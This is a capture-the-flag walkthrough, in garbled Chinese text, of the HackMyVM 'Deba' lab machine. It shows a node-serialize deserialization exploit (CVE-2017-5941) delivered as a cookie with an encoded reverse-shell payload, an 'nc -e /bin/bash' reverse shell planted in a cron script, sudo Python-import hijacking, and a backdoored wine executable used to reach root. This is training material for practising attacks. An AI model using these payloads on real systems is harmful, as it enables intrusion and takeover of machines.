---
{"created":"2024-12-27T00:23:33.192+08:00","tags":["HMV","nodejsååºåˆ—åŒ–","CVE-2017-5941","wineå‘½ä»¤","å®šæ—¶ä»»åŠ¡"],"Type":"wp","dg-publish":true,"éš¾åº¦":"â­ï¸â­ï¸â­ï¸â­ï¸â­ï¸","ä½œè€…":"nolose","aliases":null,"ç³»ç»Ÿ":"Linux","permalink":"/24-æ¸—é€/HMV/48.deba/","dgPassFrontmatter":true,"noteIcon":"2"}
---

## 1. åŸºæœ¬ä¿¡æ¯^toc

- [[24-æ¸—é€/HMV/48.deba#1. åŸºæœ¬ä¿¡æ¯^toc\|1. åŸºæœ¬ä¿¡æ¯]]
- [[24-æ¸—é€/HMV/48.deba#2. ä¿¡æ¯æ”¶é›†\|2. ä¿¡æ¯æ”¶é›†]]
	- [[24-æ¸—é€/HMV/48.deba#2.1. ç«¯å£æ‰«æ\|2.1. ç«¯å£æ‰«æ]]
	- [[24-æ¸—é€/HMV/48.deba#2.2. ç›®å½•æ‰«æ\|2.2. ç›®å½•æ‰«æ]]
- [[24-æ¸—é€/HMV/48.deba#3. nodejsååºåˆ—åŒ– (CVE-2017-5941)\|3. nodejsååºåˆ—åŒ– (CVE-2017-5941)]]
- [[24-æ¸—é€/HMV/48.deba#4. www-dataææƒlowç”¨æˆ·\|4. www-dataææƒlowç”¨æˆ·]]
- [[24-æ¸—é€/HMV/48.deba#5. å®šæ—¶ä»»åŠ¡ææƒ\|5. å®šæ—¶ä»»åŠ¡ææƒ]]
- [[24-æ¸—é€/HMV/48.deba#6. wineå‘½ä»¤ ææƒroot\|6. wineå‘½ä»¤ ææƒroot]]
	- [[24-æ¸—é€/HMV/48.deba#6.1. åˆ©ç”¨CSè·å–root\|6.1. åˆ©ç”¨CSè·å–root]]
**é¶æœºé“¾æ¥** https://hackmyvm.eu/machines/machine.php?vm=Deba
**ä½œè€…** [nolose](https://hackmyvm.eu/profile/?user=nolose)
**éš¾åº¦** â­ï¸â­ï¸â­ï¸â­ï¸â­ï¸
**å‚è€ƒæ–‡ç« ** https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/
## 2. ä¿¡æ¯æ”¶é›†
### 2.1. ç«¯å£æ‰«æ
```bash
â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/hmv/deba]
â””â”€# nmap 192.168.56.26 -p-
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-26 11:28 EST
Nmap scan report for 192.168.56.26
Host is up (0.00075s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3000/tcp open  ppp
MAC Address: 08:00:27:2F:C3:52 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 2.80 seconds

```

é¦–é¡µæ˜¯apache
![Pasted image 20241227002954](https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241227002954.png)
3000ç«¯å£é¦–é¡µ
```bash
â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/hmv/deba]
â””â”€# curl http://192.168.56.26:3000/
Hello World 
```
### 2.2. ç›®å½•æ‰«æ
```bash
â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/hmv/deba]
â””â”€# dirsearch -u http://192.168.56.26 -x 403
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /root/Desktop/hmv/deba/reports/http_192.168.56.26/_24-12-26_11-30-56.txt

Target: http://192.168.56.26/

[11:30:56] Starting:
[11:31:09] 301 -  321B  - /node_modules  ->  http://192.168.56.26/node_modules/
[11:31:09] 200 -  992B  - /node_modules/
[11:31:09] 200 -  116B  - /package.json
[11:31:09] 200 -   32KB - /package-lock.json
[11:31:12] 200 -  386B  - /server.js

Task Completed

â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/hmv/deba]
â””â”€# dirsearch -u http://192.168.56.26:3000 -x 403
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /root/Desktop/hmv/deba/reports/http_192.168.56.26_3000/_24-12-26_11-31-27.txt

Target: http://192.168.56.26:3000/

[11:31:27] Starting:

Task Completed

```

å‘ç°ä¸€ä¸ªnodejsçš„æºç 
```bash
â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/hmv/deba]
â””â”€# curl http://192.168.56.26//server.js
var express = require('express');
var cookieParser = require('cookie-parser');
var escape = require('escape-html');
var serialize = require('node-serialize');
var app = express();
app.use(cookieParser())
app.get('/', function(req, res) {
    if (req.cookies.profile) {
        var str = new Buffer(req.cookies.profile,'base64').toString();
        var obj = serialize.unserialize(str);
    if (obj.username) {
        res.send("Hello " + escape(obj.username));
    }

    } else {
        res.cookie('profile',"eyJ1c2VybmFtZSI6ImFqaW4iLCJjb3VudHJ5IjoiaW5kaWEiLCJjaXR5IjoiYmFuZ2Fsb3JlIn0=", { maxAge: 900000, httpOnly: true});
    }
res.send("Hello World");
});
app.listen(3000);
```
> åˆ†æä»£ç å¯çŸ¥ è®¿é—® `http://192.168.56.26:3000/` Web åº”ç”¨ç¨‹åºä¸­ä¼šæ£€æŸ¥å®¢æˆ·ç«¯è¯·æ±‚ä¸­æ˜¯å¦å¸¦æœ‰åä¸º `profile` çš„ Cookieï¼Œ
> å¦‚æœæœ‰ï¼Œåˆ™ä¼šå°†å…¶è§£ç ä¸º Base64 å­—ç¬¦ä¸²ï¼Œå¹¶ä½¿ç”¨ `serialize.unserialize` å°†å­—ç¬¦ä¸²ååºåˆ—åŒ–ä¸ºå¯¹è±¡ï¼Œ
> ç”±äºCookieæ˜¯æˆ‘ä»¬å¯ä»¥æ§åˆ¶çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä½¿ç”¨æ¶æ„cookieæ¥åˆ©ç”¨è¿™ä¸ªååºåˆ—åŒ–æ¼æ´


æˆ‘ä»¬å¯ä»¥å…ˆç®€å•æµ‹è¯•ä¸€ä¸‹ï¼Œå¦‚ä¿®æ”¹åå­—
```bash
â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/hmv/deba]
â””â”€# echo "eyJ1c2VybmFtZSI6ImFqaW4iLCJjb3VudHJ5IjoiaW5kaWEiLCJjaXR5IjoiYmFuZ2Fsb3JlIn0=" |base64 -d
{"username":"ajin","country":"india","city":"bangalore"} 

ä¿®æ”¹usernameçš„å€¼
â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/hmv/deba]
â””â”€# echo -n "{"username":"c1trus","country":"india","city":"bangalore"}"  |base64
e3VzZXJuYW1lOmMxdHJ1cyxjb3VudHJ5OmluZGlhLGNpdHk6YmFuZ2Fsb3JlfQ==

â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/hmv/deba]
â””â”€#  curl http://192.168.56.26:3000/ -b "profile=eyJ1c2VybmFtZSI6ImMxdHJ1cyIsImNvdW50cnkiOiJpbmRpYSIsImNpdHkiOiJiYW5nYWxvcmUifQ=="
Hello c1trus 
```
å¯ä»¥å‘ç°ç¡®å®è¢«ä¿®æ”¹äº†

ä¸‹é¢æˆ‘ä»¬å°è¯•åˆ©ç”¨è¿™ä¸ªååºåˆ—åŒ–æ¼æ´ è¿›è¡Œåå¼¹shell
è¿™é‡Œæœ‰ä¸€ä¸ªç°æˆçš„åå¼¹shellåˆ©ç”¨è„šæœ¬
https://github.com/ajinabraham/Node.Js-Security-Course/blob/master/nodejsshell.py

## 3. nodejsååºåˆ—åŒ– (CVE-2017-5941)
> è¿™é‡Œå…¶å®å°±æ˜¯åˆ©ç”¨çš„ [CVE-2017-5941](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5941)
> å¦‚æœæ„Ÿå…´è¶£ï¼Œè¿™é‡Œæœ‰åœ¨çº¿çš„[å…è´¹é¶åœº](https://yunjing.ichunqiu.com/cve/detail/923?pay=2)è®©ä½ å¤ç°

åˆ©ç”¨è„šæœ¬ç”Ÿæˆåå¼¹shellçš„payload
**æ³¨æ„** :è„šæœ¬è¦ç”¨python2è¿è¡Œ
```bash
â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/hmv/deba]
â””â”€# python2 nodejsshell.py 192.168.56.6 1234
[+] LHOST = 192.168.56.6
[+] LPORT = 1234
[+] Encoding
eval(String.fromCharCode(10,118,97,114,32,110,101,116,32,61,32,114,101,113,117,105,114,101,40,39,110,101,116,39,41,59,10,118,97,114,32,115,112,97,119,110,32,61,32,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,115,112,97,119,110,59,10,72,79,83,84,61,34,49,57,50,46,49,54,56,46,53,54,46,54,34,59,10,80,79,82,84,61,34,49,50,51,52,34,59,10,84,73,77,69,79,85,84,61,34,53,48,48,48,34,59,10,105,102,32,40,116,121,112,101,111,102,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,61,61,32,39,117,110,100,101,102,105,110,101,100,39,41,32,123,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,32,102,117,110,99,116,105,111,110,40,105,116,41,32,123,32,114,101,116,117,114,110,32,116,104,105,115,46,105,110,100,101,120,79,102,40,105,116,41,32,33,61,32,45,49,59,32,125,59,32,125,10,102,117,110,99,116,105,111,110,32,99,40,72,79,83,84,44,80,79,82,84,41,32,123,10,32,32,32,32,118,97,114,32,99,108,105,101,110,116,32,61,32,110,101,119,32,110,101,116,46,83,111,99,107,101,116,40,41,59,10,32,32,32,32,99,108,105,101,110,116,46,99,111,110,110,101,99,116,40,80,79,82,84,44,32,72,79,83,84,44,32,102,117,110,99,116,105,111,110,40,41,32,123,10,32,32,32,32,32,32,32,32,118,97,114,32,115,104,32,61,32,115,112,97,119,110,40,39,47,98,105,110,47,115,104,39,44,91,93,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,119,114,105,116,101,40,34,67,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,112,105,112,101,40,115,104,46,115,116,100,105,110,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,111,117,116,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,101,114,114,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,111,110,40,39,101,120,105,116,39,44,102,117,110,99,116,105,111,110,40,99,111,100,101,44,115,105,103,110,97,108,41,123,10,32,32,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,101,110,100,40,34,68,105,115,99,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,125,41,59,10,32,32,32,32,125,41,59,10,32,32,32,32,99,108,105,101,110,116,46,111,110,40,39,101,114,114,111,114,39,44,32,102,117,110,99,116,105,111,110,40,101,41,32,123,10,32,32,32,32,32,32,32,32,115,101,116,84,105,109,101,111,117,116,40,99,40,72,79,83,84,44,80,79,82,84,41,44,32,84,73,77,69,79,85,84,41,59,10,32,32,32,32,125,41,59,10,125,10,99,40,72,79,83,84,44,80,79,82,84,41,59,10))
```
ç„¶åå¯¹payloadè¿›è¡Œbase64ç¼–ç 

æ„é€ åºåˆ—åŒ–ä»£ç 
```bash
{"c1trus": "_$ND_FUNC$_function () { ä¸Šé¢ç”Ÿæˆçš„payload }()"}
```

ç„¶åå¯¹è¿™ä¸ªæ„é€ å‡ºæ¥çš„payloadè¿›è¡Œbase64ç¼–ç 
```bash
eyJjMXRydXMiOiAiXyQkTkRfRlVOQyQkX2Z1bmN0aW9uICgpIHtldmFsKFN0cmluZy5mcm9tQ2hhckNvZGUoMTAsMTE4LDk3LDExNCwzMiwxMTAsMTAxLDExNiwzMiw2MSwzMiwxMTQsMTAxLDExMywxMTcsMTA1LDExNCwxMDEsNDAsMzksMTEwLDEwMSwxMTYsMzksNDEsNTksMTAsMTE4LDk3LDExNCwzMiwxMTUsMTEyLDk3LDExOSwxMTAsMzIsNjEsMzIsMTE0LDEwMSwxMTMsMTE3LDEwNSwxMTQsMTAxLDQwLDM5LDk5LDEwNCwxMDUsMTA4LDEwMCw5NSwxMTIsMTE0LDExMSw5OSwxMDEsMTE1LDExNSwzOSw0MSw0NiwxMTUsMTEyLDk3LDExOSwxMTAsNTksMTAsNzIsNzksODMsODQsNjEsMzQsNDksNTcsNTAsNDYsNDksNTQsNTYsNDYsNTMsNTQsNDYsNTQsMzQsNTksMTAsODAsNzksODIsODQsNjEsMzQsNDksNTAsNTEsNTIsMzQsNTksMTAsODQsNzMsNzcsNjksNzksODUsODQsNjEsMzQsNTMsNDgsNDgsNDgsMzQsNTksMTAsMTA1LDEwMiwzMiw0MCwxMTYsMTIxLDExMiwxMDEsMTExLDEwMiwzMiw4MywxMTYsMTE0LDEwNSwxMTAsMTAzLDQ2LDExMiwxMTQsMTExLDExNiwxMTEsMTE2LDEyMSwxMTIsMTAxLDQ2LDk5LDExMSwxMTAsMTE2LDk3LDEwNSwxMTAsMTE1LDMyLDYxLDYxLDYxLDMyLDM5LDExNywxMTAsMTAwLDEwMSwxMDIsMTA1LDExMCwxMDEsMTAwLDM5LDQxLDMyLDEyMywzMiw4MywxMTYsMTE0LDEwNSwxMTAsMTAzLDQ2LDExMiwxMTQsMTExLDExNiwxMTEsMTE2LDEyMSwxMTIsMTAxLDQ2LDk5LDExMSwxMTAsMTE2LDk3LDEwNSwxMTAsMTE1LDMyLDYxLDMyLDEwMiwxMTcsMTEwLDk5LDExNiwxMDUsMTExLDExMCw0MCwxMDUsMTE2LDQxLDMyLDEyMywzMiwxMTQsMTAxLDExNiwxMTcsMTE0LDExMCwzMiwxMTYsMTA0LDEwNSwxMTUsNDYsMTA1LDExMCwxMDAsMTAxLDEyMCw3OSwxMDIsNDAsMTA1LDExNiw0MSwzMiwzMyw2MSwzMiw0NSw0OSw1OSwzMiwxMjUsNTksMzIsMTI1LDEwLDEwMiwxMTcsMTEwLDk5LDExNiwxMDUsMTExLDExMCwzMiw5OSw0MCw3Miw3OSw4Myw4NCw0NCw4MCw3OSw4Miw4NCw0MSwzMiwxMjMsMTAsMzIsMzIsMzIsMzIsMTE4LDk3LDExNCwzMiw5OSwxMDgsMTA1LDEwMSwxMTAsMTE2LDMyLDYxLDMyLDExMCwxMDEsMTE5LDMyLDExMCwxMDEsMTE2LDQ2LDgzLDExMSw5OSwxMDcsMTAxLDExNiw0MCw0MSw1OSwxMCwzMiwzMiwzMiwzMiw5OSwxMDgsMTA1LDEwMSwxMTAsMTE2LDQ2LDk5LDExMSwxMTAsMTEwLDEwMSw5OSwxMTYsNDAsODAsNzksODIsODQsNDQsMzIsNzIsNzksODMsODQsNDQsMzIsMTAyLDExNywxMTAsOTksMTE2LDEwNSwxMTEsMTEwLDQwLDQxLDMyLDEyMywxMCwzMiwzMiwzMiwzMiwzMiwzMiwzMiwzMiwxMTgsOTcsMTE0LDMyLDExNSwxMDQsMzIsNjEsMzIsMTE1LDExMiw5NywxMTksMTEwLDQwLDM5LDQ3LDk4LDEwNSwxMTAsNDcsMTE1LDEwNCwzOSw0NCw5MSw5Myw0MSw1OSwxMCwzMiwzMiwzMiwzMiwzMiwzMiwzMiwzMiw5OSwxMDgsMTA1LDEwMSwxMTAsMTE2LDQ2LDExOSwxMTQsMTA1LDExNiwxMDEsNDAsMzQsNjcsMTExLDExMCwxMTAsMTAxLDk5LDExNiwxMDEsMTAwLDMzLDkyLDExMCwzNCw0MSw1OSwxMCwzMiwzMiwzMiwzMiwzMiwzMiwzMiwzMiw5OSwxMDgsMTA1LDEwMSwxMTAsMTE2LDQ2LDExMiwxMDUsMTEyLDEwMSw0MCwxMTUsMTA0LDQ2LDExNSwxMTYsMTAwLDEwNSwxMTAsNDEsNTksMTAsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMTE1LDEwNCw0NiwxMTUsMTE2LDEwMCwxMTEsMTE3LDExNiw0NiwxMTIsMTA1LDExMiwxMDEsNDAsOTksMTA4LDEwNSwxMDEsMTEwLDExNiw0MSw1OSwxMCwzMiwzMiwzMiwzMiwzMiwzMiwzMiwzMiwxMTUsMTA0LDQ2LDExNSwxMTYsMTAwLDEwMSwxMTQsMTE0LDQ2LDExMiwxMDUsMTEyLDEwMSw0MCw5OSwxMDgsMTA1LDEwMSwxMTAsMTE2LDQxLDU5LDEwLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDExNSwxMDQsNDYsMTExLDExMCw0MCwzOSwxMDEsMTIwLDEwNSwxMTYsMzksNDQsMTAyLDExNywxMTAsOTksMTE2LDEwNSwxMTEsMTEwLDQwLDk5LDExMSwxMDAsMTAxLDQ0LDExNSwxMDUsMTAzLDExMCw5NywxMDgsNDEsMTIzLDEwLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDk5LDEwOCwxMDUsMTAxLDExMCwxMTYsNDYsMTAxLDExMCwxMDAsNDAsMzQsNjgsMTA1LDExNSw5OSwxMTEsMTEwLDExMCwxMDEsOTksMTE2LDEwMSwxMDAsMzMsOTIsMTEwLDM0LDQxLDU5LDEwLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDEyNSw0MSw1OSwxMCwzMiwzMiwzMiwzMiwxMjUsNDEsNTksMTAsMzIsMzIsMzIsMzIsOTksMTA4LDEwNSwxMDEsMTEwLDExNiw0NiwxMTEsMTEwLDQwLDM5LDEwMSwxMTQsMTE0LDExMSwxMTQsMzksNDQsMzIsMTAyLDExNywxMTAsOTksMTE2LDEwNSwxMTEsMTEwLDQwLDEwMSw0MSwzMiwxMjMsMTAsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMTE1LDEwMSwxMTYsODQsMTA1LDEwOSwxMDEsMTExLDExNywxMTYsNDAsOTksNDAsNzIsNzksODMsODQsNDQsODAsNzksODIsODQsNDEsNDQsMzIsODQsNzMsNzcsNjksNzksODUsODQsNDEsNTksMTAsMzIsMzIsMzIsMzIsMTI1LDQxLDU5LDEwLDEyNSwxMCw5OSw0MCw3Miw3OSw4Myw4NCw0NCw4MCw3OSw4Miw4NCw0MSw1OSwxMCkpIH0oKSJ9
```

å¼€å¯ç›‘å¬ å¹¶ä½¿ç”¨è¿™ä¸ªpayloadä½œä¸ºcookieç„¶åè®¿é—®
```bash
curl http://192.168.56.26:3000/ -b "profile=base64åçš„payload"
```

```bash
â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/hmv/deba]
â””â”€# pwncat-cs -lp 1234

[03:51:04] Welcome to pwncat ğŸˆ!                                                                  __main__.py:164
[03:51:09] received connection from 192.168.56.26:44754                                                bind.py:84
[03:51:09] 0.0.0.0:1234: normalizing shell path                                                    manager.py:957
           0.0.0.0:1234: upgrading from /usr/bin/dash to /usr/bin/bash                             manager.py:957
           192.168.56.26:44754: registered new host w/ db                                          manager.py:957
(local) pwncat$
(remote) www-data@debian:/var/www$ whoami
www-data

```

## 4. www-dataææƒlowç”¨æˆ·
```bash
(remote) www-data@debian:/home/low$ sudo -l
Matching Defaults entries for www-data on debian:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on debian:
    (ALL : low) NOPASSWD: /usr/bin/python3 /home/low/scripts/script.py

(remote) www-data@debian:/home/low/scripts$ ls -la
total 16
drwxr-xr-x 2 low      low      4096 may  7  2021 .
drwxr-xr-x 8 low      low      4096 may  7  2021 ..
-rwxr-xr-x 1 www-data www-data   88 may  7  2021 main.py
-rw-r--r-- 1 low      low        80 may  7  2021 script.py

(remote) www-data@debian:/home/low/scripts$ cat script.py
import main
import os

print("\n")
os.system("ip a | grep enp0s3")

print("\n")

```
è¿™é‡Œæˆ‘ä»¬å¯ä»¥ç”¨ `low` ç”¨æˆ·æ‰§è¡Œ `script.py` è€Œä¸” `script.py` å¼•å…¥äº† `main.py` æˆ‘ä»¬å½“å‰ç”¨æˆ·å¯ä»¥ä¿®æ”¹è¿™ä¸ª `main.py` æ–‡ä»¶

ä¿®æ”¹ `mian.py`
```bash
(remote) www-data@debian:/home/low/scripts$ vi main.py
(remote) www-data@debian:/home/low/scripts$ cat main.py
from os import system as main
print("\n")
print("Just main")
main("whoami")
main("/bin/bash")

```

sudoææƒ
```bash
(remote) www-data@debian:/home/low/scripts$ sudo -u low python3 /home/low/scripts/script.py

low@debian:~/scripts$ whoami
low

low@debian:~$ cat user.txt
justdeserialize

```

## 5. å®šæ—¶ä»»åŠ¡ææƒ
æˆ‘ä»¬ä½¿ç”¨ææƒè„šæœ¬è¿›è¡Œæ£€æµ‹å‘ç°å¯ä»¥åˆ©ç”¨çš„ç‚¹
```bash
*/1 *   * * *   debian /usr/bin/python3 /home/debian/Documentos/backup/dissapeared.py ; echo "Done" >> /home/debian/Documentos/log
```
`debian` ç”¨æˆ·æ¯åˆ†é’Ÿä¼šæ‰§è¡Œä¸€æ¬¡ `/home/debian/Documentos/backup/dissapeared.py`

ä½†æ˜¯ `backup/dissapeared.py` å¹¶ä¸å­˜åœ¨ï¼Œæˆ‘ä»¬è‡ªå·±å†™ä¸€ä¸ªå³å¯
```bash
low@debian:/home/debian/Documentos$  ls -la
total 12
drwxrwx---  2 debian low    4096 may  7  2021 .
drwxr-xr-x 15 debian debian 4096 may  8  2021 ..
-rw-r--r--  1 debian debian  600 dic 27 10:19 log
low@debian:/home/debian/Documentos$ mkdir backup
low@debian:/home/debian/Documentos$ vi dissapeared.py
low@debian:/home/debian/Documentos$ cat dissapeared.py
import os
os.system("nc -e /bin/bash 192.168.56.6 2233")

```
ç­‰å¾…åå¼¹å³å¯

## 6. wineå‘½ä»¤ ææƒroot
```bash
(remote) debian@debian:/home/debian$ sudo -l
Matching Defaults entries for debian on debian:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User debian may run the following commands on debian:
    (ALL : root) NOPASSWD: /bin/wine /opt/Buffer-Overflow-Vulnerable-app/brainfuck.exe
    
(remote) debian@debian:/home/debian$ ls -l /opt/Buffer-Overflow-Vulnerable-app/brainfuck.exe
-rw-r--r-- 1 debian debian 21190 may  7  2021 /opt/Buffer-Overflow-Vulnerable-app/brainfuck.exe


```
`wine ` ç®€å•æ¥è¯´å°±æ˜¯å…è®¸æˆ‘ä»¬åœ¨linuxä¸Šå…è®¸windowç¨‹åº
æˆ‘ä»¬åªè¦å°† `brainfuck.exe` æ›¿æ¢æˆæˆ‘ä»¬çš„åé—¨ç¨‹åºå³å¯

### 6.1. åˆ©ç”¨CSè·å–root
```ad-note
title:note
è¿™é‡Œæˆ‘å…ˆç”¨msfè¯•ç€ç”Ÿæˆä¸€ä¸ªexeåé—¨ ï¼Œä½†æ˜¯æ²¡æœ‰æˆåŠŸï¼Œwineæ‰§è¡Œåä¼šä¿å­˜
ç„¶åç”¨CSç”Ÿæˆexeåé—¨å¯ä»¥è¿è¡Œä¸”ä¸ä¼šæŠ¥é”™
```

msfåé—¨æŠ¥é”™
```bash
(remote) debian@debian:/home/debian$ sudo -u root /bin/wine /opt/Buffer-Overflow-Vulnerable-app/brainfuck.exe
0009:err:seh:setup_exception_record stack overflow 1200 bytes in thread 0009 eip 7bc46086 esp 00240e80 stack 0x240000-0x241000-0x340000


```
ä¸Šä¼ CSç”Ÿæˆçš„åé—¨
ç„¶åè¿è¡Œå³å¯

![Pasted image 20241227182208](https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241227182208.png)
ä½†æ˜¯ç”±äºæ˜¯linuxè¿è¡Œwindowçš„åé—¨ï¼Œ å¥½åƒæ‰§è¡Œä¸äº†å‘½ä»¤ï¼Œåæ­£æˆ‘æ²¡æœ‰æˆåŠŸ
ä½†æ˜¯æˆ‘ä»¬å¯ä»¥è¿›è¡Œæ–‡ä»¶æ“ä½œï¼Œè¿™é‡Œå¯ä»¥ç›´æ¥è¯»å–root.txt

ä½†æˆ‘è¿˜æ˜¯é€‰æ‹©å†™å…¬é’¥è¿›å»ç„¶åè¿æ¥
![Pasted image 20241227182738](https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241227182738.png)
æˆåŠŸæ‹¿ä¸‹root
```bash
â”Œâ”€â”€(rootã‰¿kali)-[/var/www/html]
â””â”€# ssh -i /root/.ssh/id_rsa root@192.168.56.26
The authenticity of host '192.168.56.26 (192.168.56.26)' can't be established.
ED25519 key fingerprint is SHA256:FQI6CQCD3uUo59olao5SmG/3b/R9quOafr6mSSLvdlA.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.56.26' (ED25519) to the list of known hosts.
Linux debian 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
root@debian:~# whoami
root
root@debian:~# cat /root/root.txt
BoFsavetheworld

```

æœ€åï¼Œå…¶å®è¿™é‡Œä¹Ÿå¯ä»¥ç”¨ `pwnkit` æ¼æ´è¿›è¡Œå†…æ ¸ææƒ